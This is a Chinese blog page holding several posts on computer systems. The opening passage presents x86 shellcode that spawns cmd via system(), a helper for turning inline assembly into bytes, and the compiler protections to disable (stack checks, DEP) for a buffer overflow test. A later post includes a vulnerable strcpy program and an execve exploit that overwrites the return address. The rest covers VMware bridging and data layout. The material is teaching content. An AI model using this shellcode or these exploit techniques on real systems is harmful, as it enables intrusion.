<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx ;//ebx=0</span><br><span class="line"></span><br><span class="line">push 0x3f3f6c6c ;//ll??</span><br><span class="line">push 0x642e7472 ;//rt.d</span><br><span class="line">push 0x6376736d ;//msvc</span><br><span class="line">mov [esp+10],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;</span><br><span class="line">mov [esp+11],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;</span><br><span class="line">mov eax,esp ;//&quot;msvcrt.dll&quot;地址</span><br><span class="line">push eax ;//&quot;msvcrt.dll&quot;</span><br><span class="line">mov eax,0x77b62864 ;//kernel32.dll:LoadLibraryA</span><br><span class="line">call eax ;//LoadLibraryA(&quot;msvcrt.dll&quot;)</span><br><span class="line">add esp,16</span><br><span class="line"></span><br><span class="line">push 0x3f646d63 ;//&quot;cmd?&quot;</span><br><span class="line">mov [esp+3],ebx ;//&apos;?&apos;-&gt;&apos;\0&apos;</span><br><span class="line">mov eax,esp;//&quot;cmd&quot;地址</span><br><span class="line">push eax ;//&quot;cmd&quot;</span><br><span class="line">mov eax,0x774ab16f ;//msvcrt.dll:system</span><br><span class="line">call eax ;//system(&quot;cmd&quot;)</span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure>
<p>上述汇编代码实质上是如下两个函数调用语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Loadlibrary(“msvcrt.dll”);</span><br><span class="line">system(“cmd”);</span><br></pre></td></tr></table></figure>
<p>不过在构造这段汇编代码时需要注意不能出现字节0，为了填充字符串的结束字符，我们使用已经初始化为0的ebx寄存器代替。另外，在对库函数调用的时候需要提前计算出函数的地址，如Loadlibrary函数的0x77b62864。计算方式如下：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findFunc</span><span class="params">(<span class="keyword">char</span>*dll_name,<span class="keyword">char</span>*func_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HINSTANCE handle=LoadLibraryA(dll_name);<span class="comment">//获取dll加载地址</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)GetProcAddress(handle,func_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数地址是在本地计算的，如果被攻击计算机的操作系统版本差别较大的话，这个地址可能是错误的。不过在《0day安全：软件漏洞分析技术》中，作者提供了一个更好的方式，感兴趣的读者可以参考该书提供的代码。因此构造一个通用的shellcode并非十分容易，如果想让攻击变得有效的话。  </p>
<h1 id="六、汇编语言自动转换"><a href="#六、汇编语言自动转换" class="headerlink" title="六、汇编语言自动转换"></a>六、汇编语言自动转换</h1><p>写出shellcode后（无论是简单的还是通用的），我们还需要将这段汇编代码转换为机器代码。如果读者对x86汇编十分熟悉的话，选择手工敲出二进制代码的话也未尝不可。不过我们都希望能让计算机帮助做完这些事，既然开发环境提供了编译器，用它们帮忙何乐而不为呢？既不用OllyDbg工具，也不适用其他的第三方工具，我们写一个简单的函数来完成这个工作。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将内嵌汇编的二进制指令dump到文件,style指定输出数组格式还是二进制形式，返回代码长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dumpCode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">goto</span> END ;<span class="comment">//略过汇编代码</span></span><br><span class="line">BEGIN:</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//在这里定义任意的合法汇编代码</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">END:</span><br><span class="line">    <span class="comment">//确定代码范围</span></span><br><span class="line">    UINT begin,end;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,BEGIN ;</span><br><span class="line">        mov begin,eax ;</span><br><span class="line">        mov eax,END ;</span><br><span class="line">        mov end,eax ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">int</span> len=end-begin;</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer,(<span class="keyword">void</span>*)begin,len);</span><br><span class="line">        <span class="comment">//四字节对齐</span></span><br><span class="line">    <span class="keyword">int</span> fill=(len-len%<span class="number">4</span>)%<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(fill--)buffer[len+fill]=<span class="number">0x90</span>;</span><br><span class="line">    <span class="comment">//返回长度</span></span><br><span class="line">    <span class="keyword">return</span> len+fill;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为C++是支持嵌入式汇编代码的，因此在函数内的汇编代码都会被整成编译为二进制代码。实现二进制转换的基本思想是读取编译器最终生成的二进制代码段数据，将数据导出到指定的缓冲区内。为了锁定嵌入式汇编代码的位置和长度，我们定义了两个标签BEGIN和END。这两个标签在汇编语言级别会被解析为实际的线性地址，但是在高级语言级是无法直接使用这两个标签值的，只能使用goto语句跳转使用它们。但是我们可以顺水推舟，使用两个局部变量在汇编级记录这两个标签的值！  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//确定代码范围</span></span><br><span class="line">UINT begin,end;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">    mov eax,BEGIN ;</span><br><span class="line">    mov begin,eax ;</span><br><span class="line">    mov eax,END ;</span><br><span class="line">    mov end,eax ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就可以得到嵌入式汇编的代码范围了，使用memcpy操作将代码数据拷贝到目标缓冲区即可（后边还用nop指令将代码按照四字节对齐）。不过我们还需要注意一个问题，嵌入式汇编在函数执行时也会执行，这显然不可以，我们只是把它当作数据而已（是数据？还是代码？），因此在函数开始的地方我们使用goto语句直接跳转到嵌入式会变语句的结尾——END标签！  </p>
<h1 id="七、攻击测试"><a href="#七、攻击测试" class="headerlink" title="七、攻击测试"></a>七、攻击测试</h1><p>按照上述内容，相信不难构造出一个简单的shellcode并攻击之前提供的漏洞函数。但是如果使用VS2010测试的话可能会碰到很多问题。经过大量的调试和资料查询，我们需要设置三处VS的项目属性。  </p>
<ol>
<li>配置-&gt;配置属性-&gt;C/C++-&gt;基本运行时检查=默认值，避免被检测栈帧失衡。</li>
<li>配置-&gt;配置属性-&gt;C/C++-&gt;缓冲区安全检查=否，避免识别缓冲区溢出漏洞。</li>
<li>配置-&gt;配置属性-&gt;链接器-&gt;高级-&gt;数据执行保护(DEP)=否，避免堆栈段不可执行。</li>
</ol>
<p>从这三处设置看来，目前的编译器已经针对缓冲区溢出攻击做了大量的保护工作（显然这会降低程序的执行性能，因此允许用户配置），使得传统的缓冲区溢出攻击变得没那么“猖狂”了，但是在计算机安全领域，“道高一尺，魔高一丈”，总有人会找到更隐蔽的攻击方式让编译器开发者措手不及。本文除了分析缓冲区溢出攻击的原理之外，更希望读者能从中感受到代码安全的重要性，并结合编译器提供的安全功能让自己的代码更加安全高效。</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/信息安全/">信息安全</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/转载/">转载</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-22-复杂数据类型的机器级表示2"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/22/2017-05-22-复杂数据类型的机器级表示2/">复杂数据类型的机器级表示（2）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/22/2017-05-22-复杂数据类型的机器级表示2/" class="article-date">
	  <time datetime="2017-05-21T16:00:00.000Z" itemprop="datePublished">五月 22, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="数据的对齐方式"><a href="#数据的对齐方式" class="headerlink" title="数据的对齐方式"></a>数据的对齐方式</h1><h2 id="数据的对齐"><a href="#数据的对齐" class="headerlink" title="数据的对齐"></a>数据的对齐</h2><p>Alignment:<strong>要求数据的地址是相应的边界地址</strong><br>各种不同长度的数据存放时，有两种处理方式：<br>按边界存放（若一个字为32位）、不按边界存放（可能会增加访问次数）<br>虽简单的策略是：按其数据长度进行对齐。例如，Windows采用策略，int型地址是4的倍数，short型地址是2的倍数，double和long long 型的是8的倍数，float型的是4的倍数，char不对齐；linux采用更宽松的策略，short型是2的倍数，其他类型如int、float、double和指针都是4的倍数。<br>要注意的是不要讲数据类型的大小与对齐的倍数混淆，数据类型的大小linux和windows基本是一样的，只是对齐方式不一样。在linux中 long long 是8个字节但是他是按照4字节对齐的。<br>例如：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SDT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">short</span> si;</span><br><span class="line">	<span class="keyword">double</span> d;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">&#125;sa[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>
<p>注意结构数组变量的最末可能需要插空，以使每个数组元素都按4字节边界对齐，但是如果不是数组的话，那就可以节省3个字节的空间  </p>
<h2 id="对齐（Alignment）"><a href="#对齐（Alignment）" class="headerlink" title="对齐（Alignment）"></a>对齐（Alignment）</h2><p>如：int I,short k,double x,char c,short j<br>如果是边界对齐的情况<br>&amp;i=0;&amp;k=4;&amp;x=8;&amp;c=16;&amp;j=18;<br>x：2个周期<br>j：1个周期<br>如果边界不对齐的情况<br>&amp;i=0;&amp;k=4;&amp;x=6;&amp;c=14;&amp;j=15;<br>x：3个周期<br>j：2个周期  </p>
<h2 id="对齐方式的设定"><a href="#对齐方式的设定" class="headerlink" title="对齐方式的设定"></a>对齐方式的设定</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br></pre></td></tr></table></figure>
<p>为编译器指定结构体和类内部的成员变量的对齐方式<br>当自然边界（如int型按4字节、short型按2字节、float按4字节）比n大时，按照n字节对齐。<br>缺省或#pragma pack()，按自然边界对齐。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((aligned(m)))</span><br></pre></td></tr></table></figure>
<p>为编译器指定一个结构体或类或联合体或一个单独的变量的对齐方式 。<br>按m字节对齐，且其占用空间大小也是m的整数倍，以保证在申请连续存储空间时各元素也按m字节对齐。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((packed))</span><br></pre></td></tr></table></figure>
<p>不对齐  </p>
<p>例如  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> f1;</span><br><span class="line">	<span class="keyword">uint8_t</span> f2;</span><br><span class="line">	<span class="keyword">uint8_t</span> f3;</span><br><span class="line">	<span class="keyword">uint32_t</span> f4;</span><br><span class="line">	<span class="keyword">uint64_t</span> f5;</span><br><span class="line">&#125;__attribute__((aligned(<span class="number">1024</span>)))ts;</span><br><span class="line"><span class="keyword">sizeof</span>(ts)==<span class="number">1024</span></span><br><span class="line">f1 on address:<span class="number">0x0</span></span><br><span class="line">f2 on address:<span class="number">0x4</span></span><br><span class="line">f3 on address:<span class="number">0x5</span></span><br><span class="line">f4 on address:<span class="number">0x8</span></span><br><span class="line">f5 on address:<span class="number">0xc</span></span><br></pre></td></tr></table></figure>
<h1 id="越界访问和缓冲区溢出"><a href="#越界访问和缓冲区溢出" class="headerlink" title="越界访问和缓冲区溢出"></a>越界访问和缓冲区溢出</h1><p>C语言程序中对数组的访问可能会有意或无意地超越数组存储区范围而无法发现。数组存储区可以看成是一个缓冲区，超越数组存储区范围的写入操作称为缓冲区溢出。<br>例子：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outputs</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer , str);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s \n"</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hacker</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"being hacked\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	outputs(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UNIX/Linux系统中，可通过调用execve函数来加载并执行程序  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename,<span class="keyword">char</span> * <span class="keyword">const</span> argv[ ],<span class="keyword">char</span> * <span class="keyword">const</span> envp[ ])</span></span>;</span><br></pre></td></tr></table></figure>
<p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。<br>在历史上，大多数UNIX系统对main函数提供了三个参数，原型如下：   </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *env[] )</span></span>;</span><br></pre></td></tr></table></figure>
<p>其中第三个参数是环境表地址。<br>ANSI C规定main函数只有两个参数，而且第三个参数与全局变量environ相比也没有带来更多益处，所以POSIX.1也规定应使用environ而不使 用第三个参数。通常用getenv和putenv函数来存取特定的环境变量，而不是用environ变量。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//假设hacker首地址0x08048411</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"./ceshi"</span></span><br><span class="line"><span class="string">"0123456789ABCDEFXXXX"</span></span><br><span class="line"><span class="string">"\x11\x84\x04\x08"</span></span><br><span class="line"><span class="string">"\x00"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *argv;</span><br><span class="line">	argv = shellcode;</span><br><span class="line">	execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/计算机网络/">计算机网络</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-19-搞定VM桥接"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/19/2017-05-19-搞定VM桥接/">搞定VM桥接</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/19/2017-05-19-搞定VM桥接/" class="article-date">
	  <time datetime="2017-05-18T16:00:00.000Z" itemprop="datePublished">五月 19, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>首先要确定是不是有Vmnet0桥接模式，有的话桥接本地有线网卡，不设置自动。</p>
<ol>
<li>点击编辑，打开虚拟网络编辑选项</li>
</ol>
<p><a href="http://wx2.sinaimg.cn/mw690/af2d2659gy1ffrk94qf6uj20j70jf3zd.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx2.sinaimg.cn/mw690/af2d2659gy1ffrk94qf6uj20j70jf3zd.jpg" class="img-fluid"><br></a></p>
<ol>
<li>点击更改设置后出现，相关的VMnet</li>
</ol>
<p><a href="http://wx3.sinaimg.cn/mw690/af2d2659gy1ffrk953aajj20iz058aa1.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx3.sinaimg.cn/mw690/af2d2659gy1ffrk953aajj20iz058aa1.jpg" class="img-fluid"><br></a></p>
<p>注意我这里是配置好的结果，没配置好的话，是没有VMnet0的</p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>没有的话按一下步骤：</p>
<ol>
<li>win+r打开运行，输入devmgmt.msc后出现设备管理器，在网络适配器中查看是否有VMware相关的选项，一个是1一个是8，把这两个虚拟网卡卸载。</li>
<li>回到虚拟网络编辑界面，将VMnet1和VMnet8移除，然后点击还原默认选项，还原好后基本上都ok。可以经行验证，和前面方法一样，只是在点击更改设置后多出来一个VMnet0</li>
<li>选中要设置的虚拟机，右击选设置选项，出现设置画面，点击网络设配器</li>
</ol>
<p><a href="http://wx4.sinaimg.cn/mw690/af2d2659gy1ffrk95kaz6j20ny0na75a.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx4.sinaimg.cn/mw690/af2d2659gy1ffrk95kaz6j20ny0na75a.jpg" class="img-fluid"><br></a></p>
<p>点击桥接模式，点击复制物理连接状态，这时候不要急着点击确定还有一步。</p>
<ol>
<li><strong>Vm的MAC地址要和本地网卡一致。！！！！ important，否则无法成功，网上别人都是这样失败的。</strong></li>
</ol>
<p><a href="http://wx1.sinaimg.cn/mw690/af2d2659gy1ffrki7l69sj20ay0dkglo.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx1.sinaimg.cn/mw690/af2d2659gy1ffrki7l69sj20ay0dkglo.jpg" class="img-fluid"><br></a></p>
<p>点击高级选项，在mac地址栏填上主机的mac地址，点击确定。</p>
<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>我决定要好好研究研究计算机网络^_^!</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vmware/">vmware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/计算机网络/">计算机网络</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-16-复杂数据类型的机器级表示1"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/16/2017-05-16-复杂数据类型的机器级表示1/">复杂数据类型的机器级表示（1）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/16/2017-05-16-复杂数据类型的机器级表示1/" class="article-date">
	  <time datetime="2017-05-15T16:00:00.000Z" itemprop="datePublished">五月 16, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="数组和指针类型的分配和访问"><a href="#数组和指针类型的分配和访问" class="headerlink" title="数组和指针类型的分配和访问"></a>数组和指针类型的分配和访问</h1><p>例如，定义一个具有4个元素的静态存储型short数据类型数组A，可以写成“static short [A];”第i个元素的地址计算公式为$$\&amp;A[0]+2*i$$。<br>假定数组A的首地址存放在EDX中，i存放在ECX中，现要将A[I]取到AX中，则所用的汇编指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movw (%edx,%ecx,2),%eax</span><br></pre></td></tr></table></figure>
<p>其中ECX为变址寄存器，在循环中增量  </p>
<p>分配在静态区的数组的初始化和访问</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> buf[<span class="number">2</span>] = &#123;<span class="number">10</span>,<span class="number">20</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += buf[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>buf是在静态区分配的数组，连接后，buf在可执行目标文件的数据段中分配空间  </p>
<p>auto型数组的初始化和访问</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">adder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> buf[<span class="number">2</span>] = &#123;<span class="number">10</span>,<span class="number">20</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i,sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;<span class="number">2</span>;++i)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += buf[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分配在栈中，故数组首地址通过EBP来定位。  </p>
<p>在指针的目标数据与数组类型相同的前提下，指针变量可以指向数组或数组中的任意元素。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> *ptr = &amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>这个程序的功能就是使ptr指向数组啊的第0个元素a[0]。a的值就是其首地址，即a=&amp;a[0]，因而a=ptr，从而有$$\&amp;a[i] = ptr+i=a+i$$以及$$a[i]=ptr[i]=<em>(ptr+i)=</em>(a+i)$$  </p>
<h1 id="结构和联合数据"><a href="#结构和联合数据" class="headerlink" title="结构和联合数据"></a>结构和联合数据</h1><h2 id="结构体数据的分配和访问"><a href="#结构体数据的分配和访问" class="headerlink" title="结构体数据的分配和访问"></a>结构体数据的分配和访问</h2><p>结构体成员在内存中主要分为：分配在栈中的auto结构性变量的首地址由EBP或ESP来定位，分配在静态区的结构型变量首地址是一个确定的静态区地址。结构性变量x各成员首地址可用“基址加偏移量”的寻址方式</p>
